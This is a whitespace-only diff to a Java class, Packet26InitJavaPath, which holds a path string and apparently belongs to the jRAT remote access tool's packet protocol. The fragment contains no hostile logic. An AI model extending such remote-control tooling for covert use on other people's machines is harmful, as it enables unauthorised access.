@@ -4,11 +4,10 @@ import java.io.DataOutputStream;
 
 import pro.jrat.common.io.StringWriter;
 
-
 public class Packet26InitJavaPath extends AbstractOutgoingPacket {
 
 	private String path;
-	
+
 	public Packet26InitJavaPath(String path) {
 		this.path = path;
 	}
